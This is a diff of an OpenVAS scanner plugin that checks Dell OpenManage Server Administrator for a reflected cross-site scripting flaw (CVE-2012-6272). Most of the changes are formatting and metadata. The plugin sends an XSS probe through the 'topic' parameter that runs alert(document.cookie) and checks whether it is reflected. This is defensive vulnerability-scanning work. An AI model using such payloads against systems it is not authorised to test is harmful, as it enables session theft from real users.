@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_dell_omsa_mult_xss_vuln.nasl 6079 2017-05-08 09:03:33Z teissa $
+# $Id: secpod_dell_omsa_mult_xss_vuln.nasl 11103 2018-08-24 10:37:26Z mmartin $
 #
 # Dell OpenManage Server Administrator Multiple XSS Vulnerabilities
 #
@@ -27,17 +27,17 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902941");
-  script_version("$Revision: 6079 $");
+  script_version("$Revision: 11103 $");
   script_cve_id("CVE-2012-6272");
   script_bugtraq_id(57212);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-08 11:03:33 +0200 (Mon, 08 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 12:37:26 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-01-30 15:21:55 +0530 (Wed, 30 Jan 2013)");
   script_name("Dell OpenManage Server Administrator Multiple XSS Vulnerabilities");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/51764");
-  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/950172");
-  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/81158");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/51764");
+  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/950172");
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/81158");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2013 SecPod");
@@ -46,7 +46,7 @@ if(description)
   script_exclude_keys("Settings/disable_cgi_scanning");
   script_dependencies("find_service.nasl", "http_version.nasl");
 
-  script_tag(name : "insight" , value : "Input passed via the 'topic' parameter to
+  script_tag(name:"insight", value:"Input passed via the 'topic' parameter to
   - /help/sm/es/Output/wwhelp/wwhimpl/js/html/index_main.htm,
   - /help/sm/ja/Output/wwhelp/wwhimpl/js/html/index_main.htm,
   - /help/sm/de/Output/wwhelp/wwhimpl/js/html/index_main.htm,
@@ -55,18 +55,15 @@ if(description)
   - /help/hip/en/msgguide/wwhelp/wwhimpl/js/html/index_main.htm and
   - /help/hip/en/msgguide/wwhelp/wwhimpl/common/html/index_main.htm is not
   properly sanitized before being returned to the user.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "This host is running Dell OpenManage Server Administrator and is
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is running Dell OpenManage Server Administrator and is
   prone to multiple cross site scripting vulnerabilities.");
-  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to execute
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
   arbitrary HTML and script code in a user's browser session in context of an
   affected site.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "Dell OpenManage Server Administrator version 6.5.0.1, 7.0.0.1
+  script_tag(name:"affected", value:"Dell OpenManage Server Administrator version 6.5.0.1, 7.0.0.1
   and 7.1.0.1");
 
   script_tag(name:"qod_type", value:"remote_app");
@@ -79,30 +76,19 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-req = "";
-res = "";
-url = "";
-port = "";
-
-## Get Port
 port = get_http_port(default:1311);
 
-## Construct https request
 req = http_get(item:"/servlet/OMSALogin?msgStatus=null", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 
-## Confirm the application before trying exploit
 if(res && res =~ "HTTP/1.. 200 OK" && ">Dell OpenManage <" >< res)
 {
-  ## Construct the XSS attack request
   url = '/help/sm/en/Output/wwhelp/wwhimpl/js/html/index_main.htm?topic="><' +
         '/iframe><iframe src="javascript:alert(document.cookie)';
 
   req = http_get(item:url, port:port);
   res = http_keepalive_send_recv(port:port, data:req);
 
-  ## Confirm exploit worked by checking the response
   if(res && res =~ "HTTP/1.. 200 OK" &&
      "javascript:alert(document.cookie)" >< res && "OMSS_Help" >< res){
     security_message(port:port);
